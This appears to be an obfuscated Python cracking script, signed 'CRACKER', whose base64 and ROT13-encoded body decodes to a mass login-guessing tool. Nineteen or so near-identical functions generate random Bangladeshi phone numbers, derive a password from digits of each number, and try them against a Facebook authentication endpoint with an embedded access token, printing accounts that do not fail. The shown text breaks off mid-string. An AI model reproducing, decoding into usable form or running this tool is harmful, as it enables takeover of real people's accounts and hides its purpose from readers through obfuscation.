# Coded by CRACKER
# cracker911181
 

import base64, codecs
magic = 'CiNjcmFja2VyCiNsb2dvKCk6CiAgICAgICAgI2NyZWF0b3I6Y3JhY2tlcjkxMTE4MQppbXBvcnQgb3MKaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQgcmFuZG9tCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQgYXMgcG9vbAppbXBvcnQgcmVxdWVzdHMKCiN0ZXh0IGNvbG91cigpCiNjcmVhdG9yOiBDUkFDS0VSOTExMTgxCm9mZj0iXHgxYlswMG0iCnVuPSJceDFiWzRtIgp3aGl0ZSA9ICdcMzNbMDBtJwpyZWQgPSAnXDMzWzkxbScKZ3JlZW4gPSAnXDMzWzkybScKeW9sbG93ID0gJ1wzM1s5M20nCmJsdWUgPSAnXDMzWzk0bScKcm9zeSA9ICdcMzNbOTVtJwpwZXN0ID0gJ1wzM1s5Nm0nCiNjb2xvdXIgZW5kCgoKZGVmIGhpMSgpOgoJZm9yIGkgaW4gcmFuZ2UoMTAwKToKCQl1cj1yYW5kb20ucmFuZGludCgxMTExMTExLDk5OTk5OTkpCgkJdXNyPXN0cih1cikKCQl1c2VyPXN0cignODgwJytjb2RlK3VzcikKCQlwYXM9c3RyKHVzZXJbNzoxM10pCgkJCgkJeD1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nK3VzZXIrJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JytwYXMrJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OGZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmbScpLnRleHQKCQkjCXByaW50KHVzZXIKCQkjCXByaW50KHBhcykKCQl4PXN0cih4WzE0OjE3XSkKCQlpZiB4PT0iNDAxIiBvciB4PT0iNjEzIjoKCQkJY29udGludWUKCQllbHNlOgoJCQlwcmludCgiW2NoZWNrcG9pbnRdXHQrIit1c2VyLCIgfCAiLHBhcykKCQkJCgkJCQoJCQkKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgoKCmRlZiBoaTIoKToKCWZvciBpIGluIHJhbmdlKDEwMCk6CgkJdXI9cmFuZG9tLnJhbmRpbnQoMTExMTExMSw5OTk5OTk5KQoJCXVzcj1zdHIodXIpCgkJdXNlcjE9c3RyKCc4ODAnK2NvZGUrdXNyKQoJCXBhczE9c3RyKHVzZXIxWzc6MTNdKQoJCQoJCWc9cmVxdWVzdHMuZ2V0KCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTEmZW1haWw9Jyt1c2VyMSsnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nK3BhczErJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OGZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmbScpLnRleHQKCQkjCXByaW50KHVzZXIKCQkjCXByaW50KHBhcykKCQl5PXN0cihnWzE0OjE3XSkKCQlpZiB5PT0iNDAxIiBvciB5PT0iNjEzIjoKCQkJY29udGludWUKCQllbHNlOgoJCQlwcmludCgiW2NoZWNrcG9pbnRdXHQrIit1c2VyMSwiIHwgIixwYXMxKQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgoKZGVmIGhpMygpOgoJZm9yIGkgaW4gcmFuZ2UoMTAwKToKCQl1cj1yYW5kb20ucmFuZGludCgxMTExMTExLDk5OTk5OTkpCgkJdXNyPXN0cih1cikKCQl1c2VyMT1zdHIoJzg4MCcrY29kZSt1c3IpCgkJcGFzMT1zdHIodXNlcjFbNzoxM10pCgkJCgkJZz1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nK3VzZXIxKycmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScrcGFzMSsnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykudGV4dAoJCSMJcHJpbnQodXNlcgoJCSMJcHJpbnQocGFzKQoJCXk9c3RyKGdbMTQ6MTddKQoJCWlmIHk9PSI0MDEiIG9yIHk9PSI2MTMiOgoJCQljb250aW51ZQoJCWVsc2U6CgkJCXByaW50KCJbY2hlY2twb2ludF1cdCsiK3VzZXIxLCIgfCAiLHBhczEpCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgpkZWYgaGk0KCk6Cglmb3IgaSBpbiByYW5nZSgxMDApOgoJCXVyPXJhbmRvbS5yYW5kaW50KDExMTExMTEsOTk5OTk5OSkKCQl1c3I9c3RyKHVyKQoJCXVzZXIxPXN0cignODgwJytjb2RlK3VzcikKCQlwYXMxPXN0cih1c2VyMVs3OjEzXSkKCQkKCQlnPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPScrdXNlcjErJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JytwYXMxKycmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKS50ZXh0CgkJIwlwcmludCh1c2VyCgkJIwlwcmludChwYXMpCgkJeT1zdHIoZ1sxNDoxN10pCgkJaWYgeT09IjQwMSIgb3IgeT09IjYxMyI6CgkJCWNvbnRpbnVlCgkJZWxzZToKCQkJcHJpbnQoIltjaGVja3BvaW50XVx0KyIrdXNlcjEsIiB8ICIscGFzMSkKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmRlZiBoaTUoKToKCWZvciBpIGluIHJhbmdlKDEwMCk6CgkJdXI9cmFuZG9tLnJhbmRpbnQoMTExMTExMSw5OTk5OTk5KQoJCXVzcj1zdHIodXIpCgkJdXNlcjE9c3RyKCc4ODAnK2NvZGUrdXNyKQoJCXBhczE9c3RyKHVzZXIxWzc6MTNdKQoJCQoJCWc9cmVxdWVzdHMuZ2V0KCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTEmZW1haWw9Jyt1c2VyMSsnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nK3BhczErJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OGZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmbScpLnRleHQKCQkjCXByaW50KHVzZXIKCQkjCXByaW50KHBhcykKCQl5PXN0cihnWzE0OjE3XSkKCQlpZiB5PT0iNDAxIiBvciB5PT0iNjEzIjoKCQkJY29udGludWUKCQllbHNlOgoJCQlwcmludCgiW2NoZWNrcG9pbnRdXHQrIit1c2VyMSwiIHwgIixwYXMxKQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmRlZiBoaTYoKToKCWZvciBpIGluIHJhbmdlKDEwMCk6CgkJdXI9cmFuZG9tLnJhbmRpbnQoMTExMTExMSw5OTk5OTk5KQoJCXVzcj1zdHIodXIpCgkJdXNlcjE9c3RyKCc4ODAnK2NvZGUrdXNyKQoJCXBhczE9c3RyKHVzZXIxWzc6MTNdKQoJCQoJCWc9cmVxdWVzdHMuZ2V0KCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTEmZW1haWw9Jyt1c2VyMSsnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nK3BhczErJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OGZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmbScpLnRleHQKCQkjCXByaW50KHVzZXIKCQkjCXByaW50KHBhcykKCQl5PXN0cihnWzE0OjE3XSkKCQlpZiB5PT0iNDAxIiBvciB5PT0iNjEzIjoKCQkJY29udGludWUKCQllbHNlOgoJCQlwcmludCgiW2NoZWNrcG9pbnRdXHQrIit1c2VyMSwiIHwgIixwYXMxKQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmRlZiBoaTcoKToKCWZvciBpIGluIHJhbmdlKDEwMCk6CgkJdXI9cmFuZG9tLnJhbmRpbnQoMTExMTExMSw5OTk5OTk5KQoJCXVzcj1zdHIodXIpCgkJdXNlcjE9c3RyKCc4ODAnK2NvZGUrdXNyKQoJCXBhczE'
love = '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'
god = 'MjIyMjIyMjCgpkZWYgaGkxNCgpOgoJZm9yIGkgaW4gcmFuZ2UoMTAwKToKCQl1cj1yYW5kb20ucmFuZGludCgxMTExMTExLDk5OTk5OTkpCgkJdXNyPXN0cih1cikKCQl1c2VyMT1zdHIoJzg4MCcrY29kZSt1c3IpCgkJcGFzMT1zdHIodXNlcjFbNzoxM10pCgkJCgkJZz1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nK3VzZXIxKycmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScrcGFzMSsnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykudGV4dAoJCSMJcHJpbnQodXNlcgoJCSMJcHJpbnQocGFzKQoJCXk9c3RyKGdbMTQ6MTddKQoJCWlmIHk9PSI0MDEiIG9yIHk9PSI2MTMiOgoJCQljb250aW51ZQoJCWVsc2U6CgkJCXByaW50KCJbY2hlY2twb2ludF1cdCsiK3VzZXIxLCIgfCAiLHBhczEpCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgpkZWYgaGkxNSgpOgoJZm9yIGkgaW4gcmFuZ2UoMTAwKToKCQl1cj1yYW5kb20ucmFuZGludCgxMTExMTExLDk5OTk5OTkpCgkJdXNyPXN0cih1cikKCQl1c2VyMT1zdHIoJzg4MCcrY29kZSt1c3IpCgkJcGFzMT1zdHIodXNlcjFbNzoxM10pCgkJCgkJZz1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nK3VzZXIxKycmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScrcGFzMSsnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykudGV4dAoJCSMJcHJpbnQodXNlcgoJCSMJcHJpbnQocGFzKQoJCXk9c3RyKGdbMTQ6MTddKQoJCWlmIHk9PSI0MDEiIG9yIHk9PSI2MTMiOgoJCQljb250aW51ZQoJCWVsc2U6CgkJCXByaW50KCJbY2hlY2twb2ludF1cdCsiK3VzZXIxLCIgfCAiLHBhczEpCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgpkZWYgaGkxNigpOgoJZm9yIGkgaW4gcmFuZ2UoMTAwKToKCQl1cj1yYW5kb20ucmFuZGludCgxMTExMTExLDk5OTk5OTkpCgkJdXNyPXN0cih1cikKCQl1c2VyMT1zdHIoJzg4MCcrY29kZSt1c3IpCgkJcGFzMT1zdHIodXNlcjFbNzoxM10pCgkJCgkJZz1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nK3VzZXIxKycmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScrcGFzMSsnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykudGV4dAoJCSMJcHJpbnQodXNlcgoJCSMJcHJpbnQocGFzKQoJCXk9c3RyKGdbMTQ6MTddKQoJCWlmIHk9PSI0MDEiIG9yIHk9PSI2MTMiOgoJCQljb250aW51ZQoJCWVsc2U6CgkJCXByaW50KCJbY2hlY2twb2ludF1cdCsiK3VzZXIxLCIgfCAiLHBhczEpCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgoKZGVmIGhpMTcoKToKCWZvciBpIGluIHJhbmdlKDEwMCk6CgkJdXI9cmFuZG9tLnJhbmRpbnQoMTExMTExMSw5OTk5OTk5KQoJCXVzcj1zdHIodXIpCgkJdXNlcjE9c3RyKCc4ODAnK2NvZGUrdXNyKQoJCXBhczE9c3RyKHVzZXIxWzc6MTNdKQoJCQoJCWc9cmVxdWVzdHMuZ2V0KCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTEmZW1haWw9Jyt1c2VyMSsnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nK3BhczErJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OGZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmbScpLnRleHQKCQkjCXByaW50KHVzZXIKCQkjCXByaW50KHBhcykKCQl5PXN0cihnWzE0OjE3XSkKCQlpZiB5PT0iNDAxIiBvciB5PT0iNjEzIjoKCQkJY29udGludWUKCQllbHNlOgoJCQlwcmludCgiW2NoZWNrcG9pbnRdXHQrIit1c2VyMSwiIHwgIixwYXMxKQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpkZWYgaGkxOCgpOgoJZm9yIGkgaW4gcmFuZ2UoMTAwKToKCQl1cj1yYW5kb20ucmFuZGludCgxMTExMTExLDk5OTk5OTkpCgkJdXNyPXN0cih1cikKCQl1c2VyMT1zdHIoJzg4MCcrY29kZSt1c3IpCgkJcGFzMT1zdHIodXNlcjFbNzoxM10pCgkJCgkJZz1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nK3VzZXIxKycmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScrcGFzMSsnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykudGV4dAoJCSMJcHJpbnQodXNlcgoJCSMJcHJpbnQocGFzKQoJCXk9c3RyKGdbMTQ6MTddKQoJCWlmIHk9PSI0MDEiIG9yIHk9PSI2MTMiOgoJCQljb250aW51ZQoJCWVsc2U6CgkJCXByaW50KCJbY2hlY2twb2ludF1cdCsiK3VzZXIxLCIgfCAiLHBhczEpCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmRlZiBoaTE5KCk6Cglmb3IgaSBpbiByYW5nZSgxMDApOgoJCXVyPXJhbmRvbS5yYW5kaW50KDExMTExMTEsOTk5OTk5OSkKCQl1c3I9c3RyKHVyKQoJCXVzZXIxPXN0cignODgwJytjb2RlK3VzcikKCQlwYXMxPXN0cih1c2VyMVs3OjEzXSkKCQkKCQlnPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPScrdXNlcjErJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JytwYXMxKycmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKS50ZXh0CgkJIwlwcmludCh1c2VyCgkJIwlwcmludChwYXMpCgkJeT1zdHIoZ1sxNDoxN10pCgkJaWYgeT09IjQwMSIgb3IgeT09IjYxMyI6CgkJCWNvbnRp